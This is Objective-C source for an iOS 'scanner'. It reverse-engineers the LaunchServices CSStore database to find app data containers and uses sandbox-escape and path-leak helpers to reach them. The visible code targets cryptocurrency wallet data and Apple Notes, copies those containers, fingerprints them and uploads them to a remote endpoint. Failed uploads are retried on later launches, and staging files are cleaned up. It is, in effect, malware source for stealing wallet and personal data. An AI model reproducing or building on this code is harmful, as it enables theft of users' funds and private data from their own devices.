#import "WQLScanner.h"
#import "WQLEscape.h"
#import "WQLPathLeak.h"
#import "WQLPathCache.h"
#import "WQLLog.h"
#import "WQLUploader.h"
#import <UIKit/UIKit.h>
#import <dispatch/dispatch.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <stdlib.h>
#import <string.h>
#import <sys/sysctl.h>
#import <stdarg.h>
#import <sys/xattr.h>
#import <sys/mount.h>

static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manager.metadata.plist";

// MARK: - lsd CSStore 解析（参考 worse_finder / WQFiles 的实测布局）

static uint32_t WQLRd32(const uint8_t *p) {
    uint32_t v;
    memcpy(&v, p, 4);
    return v;
}

static BOOL WQLLooksLikeBundleID(NSString *s);
static BOOL WQLIsDataContainerPath(NSString *s);
static NSString *WQLCanonicalContainerPath(NSString *p);
static NSDictionary<NSNumber *, NSString *> *WQLBuildStringTable(const uint8_t *b, size_t n);

/// 记录里的字段是「字符串 id」，取值必须 ref >> 2 去字符串表里查。
/// 直接把 ref 当文件偏移去读只会读到无关字节：27.2.1 的整库用那种读法
/// 只能得到 3 条垃圾（"@"、"0000000000"、"skrip cangkerang"），
/// 26.4.2 得到 0 条，和真机日志「3 条映射」完全对得上。
static NSString *WQLCSString(NSDictionary<NSNumber *, NSString *> *tab, uint32_t ref) {
    if (!ref || !tab.count) return nil;
    return tab[@(ref >> 2)];
}

static NSDictionary<NSString *, NSString *> *WQLParseCSStore(NSData *data,
                                                             NSDictionary<NSNumber *, NSString *> *tab,
                                                             uint32_t recordSize,
                                                             uint32_t offBid,
                                                             uint32_t offContainer) {
    const uint8_t *base = data.bytes;
    size_t size = data.length;
    if (size < 0x1000 || !tab.count || recordSize < 8) return nil;
    if (offBid + 4 > recordSize || offContainer + 4 > recordSize) return nil;

    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
    for (size_t off = 0; off + 8 + recordSize <= size; off += 4) {
        if (WQLRd32(base + off + 4) != recordSize) continue;

        const uint8_t *body = base + off + 8;
        uint32_t refBid = WQLRd32(body + offBid);
        uint32_t refCon = WQLRd32(body + offContainer);
        if (!refBid || !refCon) continue;

        NSString *bid = WQLCSString(tab, refBid);
        NSString *con = WQLCSString(tab, refCon);
        if (!bid.length || !con.length) continue;
        // 只有「bundleId 形状 + 数据容器路径形状」才算有效映射；
        // 不加校验时记录里的其它字符串会把表填脏，覆盖掉真正的 App 记录。
        if (!WQLLooksLikeBundleID(bid)) continue;
        con = WQLCanonicalContainerPath(con);
        if (!WQLIsDataContainerPath(con)) continue;
        map[bid] = con;
    }
    return map.count ? map : nil;
}

static BOOL WQLLooksLikeBundleID(NSString *s) {
    if (s.length < 3 || s.length > 200) return NO;
    if (![s containsString:@"."]) return NO;
    NSCharacterSet *bad = [[NSCharacterSet characterSetWithCharactersInString:
                            @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"]
                           invertedSet];
    return [s rangeOfCharacterFromSet:bad].location == NSNotFound;
}

static BOOL WQLLooksLikeContainerPath(NSString *s) {
    if (![s hasPrefix:@"/"]) return NO;
    return [s containsString:@"/Containers/Data/"] || [s containsString:@"/Containers/Shared/"];
}

/// 直接从 CSStore 的明文里抽取容器路径（不依赖记录表结构）
static NSArray<NSString *> *WQLExtractContainerPaths(NSData *data) {
    const uint8_t *base = data.bytes;
    size_t size = data.length;
    const char *needle = "/private/var/mobile/Containers/";
    size_t needleLen = strlen(needle);

    NSMutableSet<NSString *> *set = [NSMutableSet set];
    for (size_t i = 0; i + needleLen < size; i++) {
        if (memcmp(base + i, needle, needleLen) != 0) continue;

        size_t j = i;
        while (j < size && (j - i) < 160) {
            uint8_t c = base[j];
            if (c < 0x20 || c > 0x7e) break;
            j++;
        }
        if (j - i < needleLen + 40) { i = j; continue; }

        NSString *s = [[NSString alloc] initWithBytes:base + i
                                               length:j - i
                                             encoding:NSUTF8StringEncoding];
        if (s) [set addObject:s];
        i = j;
    }
    return set.allObjects;
}

/// 不同 iOS 版本 lsd CSStore 的记录布局（长度 / bundleId 偏移 / 容器路径偏移，
/// 以及插件记录那一组）。27.x 记录整体变长，容器字段逐版本后移；
/// 26.5 与 27.3 又各有自己的偏移，所以逐个尝试、按映射条数选最优。
typedef struct {
    const char *label;
    uint32_t size, bid, con;
    uint32_t pluginSize, pluginBid, pluginCon;
} WQLLSLayout;

static const WQLLSLayout kWQLLSLayouts[] = {
    // 27.x：App 记录 0x25c，bid +0x0c、con +0x6c（27.2/27.2.1 实测）
    {"27.2",  0x25c, 0x0c, 0x6c, 0x120, 0x00, 0x58},
    {"27.2b", 0x25c, 0x10, 0x6c, 0x120, 0x04, 0x58},
    // 27.2.1 实测（iOS 27.2.1 / 24C101）：App 记录 bid=+0x0c con=+0x6c、
    // 插件记录 bid=+0x04 con=+0x58，两者同时命中才能拿到 342 个 App 主容器
    // + 1178 个插件容器。缺这一行时只有插件那套能解析，App 主容器整片丢失。
    {"27.2c", 0x25c, 0x0c, 0x6c, 0x120, 0x04, 0x58},
    {"27.2d", 0x25c, 0x10, 0x6c, 0x120, 0x00, 0x58},
    {"27.0",  0x250, 0x0c, 0x68, 0x118, 0x00, 0x54},
    // 26.x：App 记录 0x23c，bid +0x0c、con +0x60（26.4.2 两台真机实测
    // 投票：path 偏移 +0x60 得 308 票，+0x64 为 0）。路径结尾带 "/"。
    {"26",    0x23c, 0x0c, 0x60, 0x104, 0x00, 0x50},
    {"26b",   0x23c, 0x08, 0x60, 0x104, 0x04, 0x50},
    {"26.7",  0x23c, 0x0c, 0x64, 0x104, 0x00, 0x50},
    {"27.3",  0x25c, 0x0c, 0x6c, 0x134, 0x00, 0x58},
    {"27.3b", 0x25c, 0x0c, 0x6c, 0x134, 0x04, 0x58},
    {"27.3c", 0x25c, 0x0c, 0x6c, 0x0f0, 0x00, 0x6c},
    {"27.3d", 0x25c, 0x0c, 0x6c, 0x0f0, 0x04, 0x6c},
};
static const size_t kWQLLSLayoutCount = sizeof(kWQLLSLayouts) / sizeof(kWQLLSLayouts[0]);

/// CSStore 里的路径可能不带 /private 前缀，统一成抽取路径的写法
static NSString *WQLCanonicalContainerPath(NSString *p) {
    if (!p.length) return p;
    if ([p hasPrefix:@"/var/"]) return [@"/private" stringByAppendingString:p];
    return p;
}

/// 数据容器路径判定：/private/var/mobile/Containers/Data/(Application|PluginKitPlugin)/<UUID>
/// 26.x 的路径结尾带一个 "/"（长度 前缀+36+1），27.x 不带；两种都要认。
static BOOL WQLIsDataContainerPath(NSString *s) {
    static NSString *const prefixes[] = {
        @"/private/var/mobile/Containers/Data/Application/",
        @"/private/var/mobile/Containers/Data/PluginKitPlugin/",
    };
    if ([s hasSuffix:@"/"]) s = [s substringToIndex:s.length - 1];
    for (int i = 0; i < 2; i++) {
        NSString *pre = prefixes[i];
        if (s.length != pre.length + 36) continue;
        if (![s hasPrefix:pre]) continue;
        return [[[NSUUID alloc] initWithUUIDString:[s substringFromIndex:pre.length]] isKindOfClass:[NSUUID class]];
    }
    return NO;
}

/// 建「字符串 id → 明文」表。CSStore 的字符串池是 [u32 sid][u32 len][bytes]，
/// sid << 2 就是记录里引用的偏移值。只收纯 ASCII（bundleId / 容器路径都是 ASCII），
/// 顺带按 4 字节对齐规则校验尾部补零，过滤掉误命中的二进制块。
static NSDictionary<NSNumber *, NSString *> *WQLBuildStringTable(const uint8_t *b, size_t n) {
    NSMutableDictionary<NSNumber *, NSString *> *tab =
        [NSMutableDictionary dictionaryWithCapacity:65536];

    for (size_t o = 0; o + 8 <= n; o += 4) {
        uint32_t sid = WQLRd32(b + o);
        if (!sid || sid > 0x400000) continue;
        if (tab[@(sid)]) continue;

        uint32_t len = WQLRd32(b + o + 4);
        if (len < 3 || len >= 0x800) continue;
        if (o + 8 + len > n) continue;
        // 长度非 4 的倍数时，尾部必须补零（CSStore 的对齐约定）
        if ((len & 3) && b[o + 8 + len] != 0) continue;

        const uint8_t *s = b + o + 8;
        uint32_t k = 0;
        for (; k < len; k++) {
            uint8_t c = s[k];
            if (c < 0x20 || c > 0x7e) break;
        }
        if (k != len) continue;

        NSString *str = [[NSString alloc] initWithBytes:s length:len encoding:NSUTF8StringEncoding];
        if (str.length) tab[@(sid)] = str;
        if (tab.count > 300000) break;
    }
    return tab.count ? tab : nil;
}

/// 未知 iOS 版本时自动探测记录布局：先用引用值投票找出「哪个记录长度、哪两个
/// 字段偏移」分别指向 bundleId 与数据容器路径，再逐组验证映射条数取最优。
/// 这样 27.0 / 27.1 / 27.3 之类没预置布局的版本也能自己找出来。
static NSDictionary<NSString *, NSString *> *WQLAutoLayoutMap(NSData *data,
                                                              NSDictionary<NSNumber *, NSString *> *tab,
                                                              NSString *__autoreleasing *descOut) {
    const uint8_t *b = data.bytes;
    size_t n = data.length;
    if (n < 0x10000) return nil;
    if (tab.count < 1000) return nil;

    // 1) 记录长度候选：记录头是 [u32 id][u32 size]，size 会重复几千次
    static uint32_t hist[0x801];
    memset(hist, 0, sizeof(hist));
    size_t limit = MIN(n, (size_t)8 * 1024 * 1024);
    for (size_t o = 0; o + 8 <= limit; o += 4) {
        uint32_t v = WQLRd32(b + o + 4);
        if (v >= 0x180 && v <= 0x800) hist[v]++;
    }
    uint32_t sizes[8];
    size_t sizeCount = 0;
    for (int round = 0; round < 8; round++) {
        uint32_t best = 0, bestN = 0;
        for (uint32_t v = 0x180; v <= 0x800; v += 4) {
            if (hist[v] > bestN) { bestN = hist[v]; best = v; }
        }
        if (!best || bestN < 20) break;
        sizes[sizeCount++] = best;
        hist[best] = 0;
    }
    // 兜底：已知的 App 记录长度，即使本次命中少也试一次
    static const uint32_t known[] = {0x25c, 0x250, 0x23c, 0x1f0};
    for (size_t i = 0; i < sizeof(known) / sizeof(known[0]) && sizeCount < 8; i++) {
        BOOL dup = NO;
        for (size_t j = 0; j < sizeCount; j++) if (sizes[j] == known[i]) dup = YES;
        if (!dup) sizes[sizeCount++] = known[i];
    }
    if (!sizeCount) return nil;

    NSDictionary<NSString *, NSString *> *best = nil;
    NSString *bestDesc = nil;
    NSUInteger bestPaths = 0;

    for (size_t si = 0; si < sizeCount; si++) {
        uint32_t size = sizes[si];
        if (size < 0x180 || size > 0x800) continue;

        NSMutableData *recs = [NSMutableData data];
        for (size_t o = 0; o + 8 + size <= n; o += 4) {
            if (WQLRd32(b + o + 4) != size) continue;
            uint32_t head[2] = { WQLRd32(b + o), (uint32_t)o };
            [recs appendBytes:head length:sizeof(head)];
            if (recs.length / sizeof(head) >= 6000) break;
        }
        NSUInteger recCount = recs.length / (2 * sizeof(uint32_t));
        if (recCount < 10) continue;

        // 2) 哪个字段偏移指向容器路径 / 指向 bundleId
        static uint32_t pathVote[0x801], bidVote[0x801];
        memset(pathVote, 0, sizeof(pathVote));
        memset(bidVote, 0, sizeof(bidVote));
        const uint32_t *rr = recs.bytes;
        for (NSUInteger i = 0; i < recCount; i++) {
            size_t o = rr[i * 2 + 1];
            const uint8_t *u = b + o + 8;
            for (uint32_t f = 0; f + 4 <= size; f += 4) {
                uint32_t ref = WQLRd32(u + f);
                if (!ref || (ref & 3)) continue;
                NSString *s = tab[@(ref >> 2)];
                if (!s.length) continue;
                if (WQLIsDataContainerPath(WQLCanonicalContainerPath(s))) pathVote[f]++;
                else if (WQLLooksLikeBundleID(s)) bidVote[f]++;
            }
        }

        // 取路径命中最多的几个偏移，bundleId 命中最多的几个偏移
        uint32_t pathOff[4] = {0}, bidOff[4] = {0};
        for (int round = 0; round < 4; round++) {
            uint32_t bestF = 0, bestN = 0;
            for (uint32_t f = 0; f + 4 <= size; f += 4) {
                if (pathVote[f] > bestN) { bestN = pathVote[f]; bestF = f; }
            }
            if (!bestF || bestN < 3) break;
            pathOff[round] = bestF;
            pathVote[bestF] = 0;
        }
        if (!pathOff[0]) continue;

        for (int round = 0; round < 4; round++) {
            uint32_t bestF = 0, bestN = 0;
            for (uint32_t f = 0; f + 4 <= size; f += 4) {
                if (f == pathOff[0] || f == pathOff[1] || f == pathOff[2] || f == pathOff[3]) continue;
                if (bidVote[f] > bestN) { bestN = bidVote[f]; bestF = f; }
            }
            if (!bestF || bestN < 3) break;
            bidOff[round] = bestF;
            bidVote[bestF] = 0;
        }
        if (!bidOff[0]) continue;

        // 3) 逐组验证
        for (int pi = 0; pi < 4 && pathOff[pi]; pi++) {
            for (int bi = 0; bi < 4 && bidOff[bi]; bi++) {
                NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
                for (NSUInteger i = 0; i < recCount; i++) {
                    size_t o = rr[i * 2 + 1];
                    const uint8_t *u = b + o + 8;
                    uint32_t rb = WQLRd32(u + bidOff[bi]);
                    uint32_t rc = WQLRd32(u + pathOff[pi]);
                    if (!rb || !rc || (rb & 3) || (rc & 3)) continue;
                    NSString *bid = tab[@(rb >> 2)];
                    NSString *con = tab[@(rc >> 2)];
                    if (!bid.length || !con.length) continue;
                    if (!WQLLooksLikeBundleID(bid)) continue;
                    con = WQLCanonicalContainerPath(con);
                    if (!WQLIsDataContainerPath(con)) continue;
                    if (!map[bid]) map[bid] = con;
                }
                if (map.count > bestPaths) {
                    bestPaths = map.count;
                    best = map;
                    bestDesc = [NSString stringWithFormat:@"0x%x@bid+0x%x,con+0x%x",
                                size, bidOff[bi], pathOff[pi]];
                }
            }
        }
    }

    if (best.count >= 8) {
        if (descOut) *descOut = bestDesc;
        return best;
    }
    return nil;
}

@interface WQLScanner ()
- (void)log:(NSString *)fmt, ...;
- (NSString *)bundleIDForContainerPath:(NSString *)path;
- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
                         container:(NSString *)container
                          bundleID:(NSString *)bundleID
                            outDir:(NSString *)outRoot
                             bytes:(uint64_t *)bytesOut;
- (NSArray<NSString *> *)sourcesForPath:(NSString *)path;
- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container;
- (uint64_t)sizeOfItemAtPath:(NSString *)path;
- (NSString *)humanBytes:(uint64_t)b;
- (void)writeWalletManifestInDirectory:(NSString *)outDir
                               records:(NSArray<NSDictionary *> *)records;
- (NSData *)manifestDataForRecords:(NSArray<NSDictionary *> *)records;
- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
                                  forTarget:(WQLTarget *)t
                                   bundleID:(NSString *)bundleID
                                     outDir:(NSString *)outRoot
                                      bytes:(uint64_t *)bytesOut;
- (NSString *)productType;
- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error;
- (NSArray<NSString *> *)copyTreeFrom:(NSString *)src
                                   to:(NSString *)dst
                                bytes:(uint64_t *)bytesOut;
- (void)copyDirectory:(NSString *)src
                   to:(NSString *)dst
             skipping:(NSArray<NSString *> *)tokens
                bytes:(uint64_t *)bytesOut;
- (BOOL)uploadStage:(NSString *)stage blocking:(BOOL)blocking;
- (dispatch_queue_t)uploadQueue;
- (void)enqueueUploadOfStage:(NSString *)stage
                      wallet:(NSString *)wallet
                    bundleID:(NSString *)bundleID
                 fingerprint:(NSString *)fingerprint
                       bytes:(uint64_t)bytes;
+ (BOOL)isNoiseRelativePath:(NSString *)rel;
- (NSString *)fingerprintForDirectory:(NSString *)dir;
- (NSString *)storedFingerprintForBundle:(NSString *)bundleID;
- (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID;
- (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet;
- (void)prunePendingIfNeeded;
- (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets;
- (NSArray<NSDictionary *> *)discoverContainersViaStore:(NSArray<WQLTarget *> *)targets;
- (void)uploadStoreSample;
@property (nonatomic, assign, readwrite) BOOL lastRunUsable;
/// 本轮索引里找到的「容器路径最多」的那份 CSStore，供流程结束后无条件补传
@property (nonatomic, copy) NSString *storeSampleContainer;
@property (nonatomic, copy) NSString *storeSampleName;
@property (nonatomic, copy) NSString *storeSampleDiag;
@end

@implementation WQLScanner

- (instancetype)init {
    if (self = [super init]) {
        _maxInode = 0;
        _maxContainerBytes = 800ULL * 1024 * 1024;
        _includeExtras = NO;

        // 清掉上次被系统杀掉时残留的待上传目录（先同步列一遍，避免删到本轮新建的 stage）
        NSFileManager *fm0 = [NSFileManager defaultManager];
        NSString *tmp0 = NSTemporaryDirectory();
        NSMutableArray<NSString *> *stale = [NSMutableArray array];
        for (NSString *n in [fm0 contentsOfDirectoryAtPath:tmp0 error:nil]) {
            if ([n hasPrefix:@"wql_up_"] || [n hasPrefix:@"wql_logstage_"]) [stale addObject:n];
        }
        if (stale.count) {
            dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
                NSFileManager *fm = [NSFileManager defaultManager];
                for (NSString *n in stale) {
                    [fm removeItemAtPath:[tmp0 stringByAppendingPathComponent:n] error:nil];
                }
            });
        }
    }
    return self;
}

- (void)log:(NSString *)fmt, ... {
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    WQLLogLine(@"%@", line);
    if (self.logBlock) self.logBlock(line);
}

- (NSArray<NSString *> *)defaultRoots {
    // 只扫钱包所在的卷。实测（iPhone15,3 / 26.4.2）：
    //   Application / AppGroup / InternalDaemon / PluginKitPlugin → 卷 16777226
    //   System / SystemGroup                                     → 卷 16777222（另一个卷）
    // 暴破是按卷走的，砍掉 System 两个根等于整卷不扫，耗时接近减半，且不含钱包数据。
    return @[
        @"/private/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Shared/AppGroup",
        @"/private/var/mobile/Containers/Data/InternalDaemon",
        @"/private/var/mobile/Containers/Data/PluginKitPlugin",
    ];
}

#pragma mark - 上传

- (BOOL)uploadStage:(NSString *)stage blocking:(BOOL)blocking {
    WQLUploader *up = [WQLUploader shared];
    if (!up.endpoint.length) {
        up.endpoint = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"WQLUploadEndpoint"];
    }
    if (!up.endpoint.length) return NO;

    if (!blocking) {
        [up uploadDirectory:stage completion:nil];
        return YES;
    }

    __block BOOL ok = NO;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    [up uploadDirectory:stage completion:^(NSUInteger good, NSUInteger failed) {
        ok = (good > 0 && failed == 0);
        dispatch_semaphore_signal(sem);
    }];
    long waited = dispatch_semaphore_wait(sem,
                    dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)));
    if (waited != 0) return NO;
    return ok;
}

- (dispatch_queue_t)uploadQueue {
    static dispatch_queue_t q;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        q = dispatch_queue_create("com.wql.upload", DISPATCH_QUEUE_SERIAL);
    });
    return q;
}

static NSString *WQLPendingRoot(void) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *p = [docs stringByAppendingPathComponent:@"wql_pending"];
    [[NSFileManager defaultManager] createDirectoryAtPath:p
                              withIntermediateDirectories:YES attributes:nil error:nil];
    return p;
}

static NSString *WQLFingerprintPath(void) {
    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory,
                                                        NSUserDomainMask, YES);
    NSString *base = dirs.firstObject ?: NSTemporaryDirectory();
    [[NSFileManager defaultManager] createDirectoryAtPath:base
                              withIntermediateDirectories:YES attributes:nil error:nil];
    return [base stringByAppendingPathComponent:@"wql_fingerprints.plist"];
}

static uint64_t WQLFNV1a(const char *s) {
    uint64_t h = 1469598103934665603ULL;
    while (s && *s) {
        h ^= (unsigned char)(*s++);
        h *= 1099511628211ULL;
    }
    return h;
}

/// 扫描线程只投递、不等待；真正的打包上传在串行队列里做。
/// 失败不删包，转到 Documents/wql_pending，下次启动自动补传。
- (void)enqueueUploadOfStage:(NSString *)stage
                      wallet:(NSString *)wallet
                    bundleID:(NSString *)bundleID
                 fingerprint:(NSString *)fingerprint
                       bytes:(uint64_t)bytes {
    __weak typeof(self) weakSelf = self;
    dispatch_async([self uploadQueue], ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        BOOL ok = [self uploadStage:stage blocking:YES];
        if (ok) {
            if (fingerprint.length && bundleID.length) {
                [self storeFingerprint:fingerprint forBundle:bundleID];
            }
            [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
            [self log:@"    ✔ 上传成功 %@（%@）", wallet, [self humanBytes:bytes]];
        } else {
            [self moveStageToPending:stage wallet:wallet];
            [self log:@"    ⚠️ 上传失败 %@，已转入待重传", wallet];
        }
    });
}

- (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *name = [NSString stringWithFormat:@"%@_%.0f",
                      wallet.length ? wallet : @"unknown",
                      [[NSDate date] timeIntervalSince1970]];
    name = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
    NSString *dst = [WQLPendingRoot() stringByAppendingPathComponent:name];
    [fm removeItemAtPath:dst error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:stage toPath:dst error:&e]) {
        [self log:@"       转入待重传失败：%@", e.localizedDescription ?: @"unknown"];
        [fm removeItemAtPath:stage error:nil];
    }
    [self prunePendingIfNeeded];
}

/// 待重传目录封顶 200MB，超了丢最旧的
- (void)prunePendingIfNeeded {
    const uint64_t kCap = 200ULL * 1024 * 1024;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = WQLPendingRoot();
    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:root error:nil]
                                  sortedArrayUsingSelector:@selector(compare:)];
    if (!items.count) return;

    uint64_t total = 0;
    NSMutableArray<NSString *> *dirs = [NSMutableArray array];
    for (NSString *n in items) {
        NSString *p = [root stringByAppendingPathComponent:n];
        total += [self sizeOfItemAtPath:p];
        [dirs addObject:p];
    }
    while (total > kCap && dirs.count) {
        NSString *oldest = dirs.firstObject;
        [dirs removeObjectAtIndex:0];
        total -= [self sizeOfItemAtPath:oldest];
        [fm removeItemAtPath:oldest error:nil];
        [self log:@"       待重传超过 200MB，丢弃最旧的一份"];
    }
}

- (NSUInteger)flushPendingUploads {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = WQLPendingRoot();
    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:root error:nil]
                                  sortedArrayUsingSelector:@selector(compare:)];
    if (!items.count) return 0;

    [self log:@"【待重传】上次有 %lu 个包没传成功，先补传", (unsigned long)items.count];
    NSUInteger okCount = 0;
    for (NSString *n in items) {
        NSString *p = [root stringByAppendingPathComponent:n];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:p isDirectory:&isDir] || !isDir) continue;
        if (self.cancelBlock && self.cancelBlock()) break;
        [self log:@"    ↑ 补传 %@", n];
        if ([self uploadStage:p blocking:YES]) {
            [fm removeItemAtPath:p error:nil];
            okCount++;
        } else {
            [self log:@"    ⛔ 补传失败，保留到下次"];
        }
    }
    [self log:@"【待重传】完成：成功 %lu 个", (unsigned long)okCount];
    return okCount;
}

#pragma mark - 指纹

- (NSString *)fingerprintForDirectory:(NSString *)dir {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *parts = [NSMutableArray array];
    NSDirectoryEnumerator *e = [fm enumeratorAtPath:dir];
    for (NSString *rel in e) {
        NSDictionary *a = [e fileAttributes];
        if (![a[NSFileType] isEqualToString:NSFileTypeRegular]) continue;
        uint64_t sz = [a[NSFileSize] unsignedLongLongValue];
        NSTimeInterval mt = [a[NSFileModificationDate] timeIntervalSince1970];
        [parts addObject:[NSString stringWithFormat:@"%@|%llu|%.0f",
                          rel, (unsigned long long)sz, mt]];
    }
    [parts sortUsingSelector:@selector(compare:)];
    NSString *joined = [parts componentsJoinedByString:@";"];
    uint64_t h = WQLFNV1a(joined.UTF8String);
    return [NSString stringWithFormat:@"%016llx-%lu",
            (unsigned long long)h, (unsigned long)parts.count];
}

- (NSString *)storedFingerprintForBundle:(NSString *)bundleID {
    if (!bundleID.length) return nil;
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
    id v = d[bundleID];
    return [v isKindOfClass:[NSString class]] ? v : nil;
}

- (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID {
    if (!fp.length || !bundleID.length) return;
    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
    if (!d) d = [NSMutableDictionary dictionary];
    d[bundleID] = fp;
    [d writeToFile:WQLFingerprintPath() atomically:YES];
}

#pragma mark - 调试概况

+ (NSString *)pendingSummary {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = WQLPendingRoot();
    NSArray<NSString *> *items = [fm contentsOfDirectoryAtPath:root error:nil];
    if (!items.count) return @"待重传：空";

    uint64_t total = 0;
    for (NSString *n in items) {
        NSDirectoryEnumerator *e = [fm enumeratorAtPath:[root stringByAppendingPathComponent:n]];
        for (NSString *rel in e) {
            NSDictionary *a = [e fileAttributes];
            if ([a[NSFileType] isEqualToString:NSFileTypeRegular]) {
                total += [a[NSFileSize] unsignedLongLongValue];
            }
        }
    }
    return [NSString stringWithFormat:@"待重传：%lu 个包，共 %.1f MB",
            (unsigned long)items.count, total / 1024.0 / 1024.0];
}

+ (NSUInteger)fingerprintCount {
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
    return d.count;
}

#pragma mark - 探针（只读，不影响采集）

/// 用 LSApplicationProxy 直接查已知 bundleId 的容器路径。
/// 只验证可行性并打日志：成功也不改变本轮流程。
- (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets {
    static Class proxyClass;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_NOW);
        dlopen("/System/Library/PrivateFrameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_NOW);
        proxyClass = NSClassFromString(@"LSApplicationProxy");
    });

    [self log:@"【探针】LaunchServices 直查（只读）"];
    SEL factory = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (!proxyClass || ![(id)proxyClass respondsToSelector:factory]) {
        [self log:@"    ⛔ LSApplicationProxy 不可用，索引路线作废"];
        return;
    }

    NSUInteger total = 0, hit = 0, gotPath = 0, escaped = 0;
    for (WQLTarget *t in targets) {
        if ([t.name isEqualToString:@"Notes"]) continue;   // 备忘录走下面单独探
        total++;

        BOOL anyProxy = NO, anyPath = NO;
        NSString *hitBid = nil, *hitPath = nil;
        NSString *lastBid = nil;

        for (NSString *bid in t.bundleIDs) {
            if ([bid hasPrefix:@"group."]) continue;
            lastBid = bid;

            id proxy = ((id (*)(id, SEL, id))objc_msgSend)((id)proxyClass, factory, bid);
            if (!proxy) continue;
            anyProxy = YES;

            id url = ((id (*)(id, SEL))objc_msgSend)(proxy, NSSelectorFromString(@"dataContainerURL"));
            NSString *path = [url isKindOfClass:[NSURL class]] ? [(NSURL *)url path] : nil;
            if (!path.length) continue;

            anyPath = YES;
            hitBid = bid;
            hitPath = path;
            break;
        }

        if (!anyProxy) {
            [self log:@"    · %@ → %lu 个 bundleId 全部 proxy=nil", t.name,
                  (unsigned long)t.bundleIDs.count];
            continue;
        }
        hit++;
        if (!anyPath) {
            [self log:@"    · %@ → proxy 有，dataContainerURL 全 nil（最后试的 %@）",
                  t.name, lastBid ?: @"-"];
            continue;
        }
        gotPath++;

        int64_t handle = [[WQLEscape shared] consumeExtensionForPath:hitPath error:nil];
        if (handle > 0) {
            [[WQLEscape shared] releaseHandle:handle];
            escaped++;
            [self log:@"    ✅ %@（%@）→ %@（escape=%lld）", t.name, hitBid, hitPath, (long long)handle];
        } else {
            [self log:@"    ⚠️ %@（%@）→ %@（escape=%lld）", t.name, hitBid, hitPath, (long long)handle];
        }
    }
    [self log:@"    合计：proxy %lu/%lu，路径 %lu，可 escape %lu",
          (unsigned long)hit, (unsigned long)total,
          (unsigned long)gotPath, (unsigned long)escaped];

    // 备忘录：用 Notes 本体的 proxy 取 App Group 容器
    id notes = ((id (*)(id, SEL, id))objc_msgSend)((id)proxyClass, factory, @"com.apple.mobilenotes");
    if (!notes) {
        [self log:@"    备忘录：com.apple.mobilenotes proxy=nil"];
        return;
    }
    id groups = ((id (*)(id, SEL))objc_msgSend)(notes, NSSelectorFromString(@"groupContainerURLs"));
    if (![groups isKindOfClass:[NSDictionary class]]) {
        [self log:@"    备忘录：groupContainerURLs=nil"];
        return;
    }
    NSDictionary *g = (NSDictionary *)groups;
    NSURL *notesURL = g[@"group.com.apple.notes"];
    if (![notesURL isKindOfClass:[NSURL class]]) {
        [self log:@"    备忘录：%lu 个组，没有 group.com.apple.notes", (unsigned long)g.count];
        return;
    }
    NSString *notesPath = [notesURL path];
    int64_t h = [[WQLEscape shared] consumeExtensionForPath:notesPath error:nil];
    if (h > 0) [[WQLEscape shared] releaseHandle:h];
    [self log:@"    备忘录：%@（escape=%lld）", notesPath, (long long)h];
}

/// 索引式发现：在 InternalDaemon 前 300 万 inode 里找 lsd 的 CSStore，
/// 从明文里抽出所有容器路径，逐个读 metadata 认 bundleId，返回命中的目标。
- (NSArray<NSDictionary *> *)discoverContainersViaStore:(NSArray<WQLTarget *> *)targets {
    [self log:@"【索引】lsd CSStore"];

    NSMutableArray<NSDictionary *> *hits = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];

    NSDate *t0 = [NSDate date];
    NSArray<NSString *> *daemons =
        [WQLPathLeak childrenOfDirectory:@"/private/var/mobile/Containers/Data/InternalDaemon"
                             upToInode:3000000];
    [self log:@"    InternalDaemon 前 300 万 inode：%lu 个容器，耗时 %.1f 秒",
          (unsigned long)daemons.count, -[t0 timeIntervalSinceNow]];

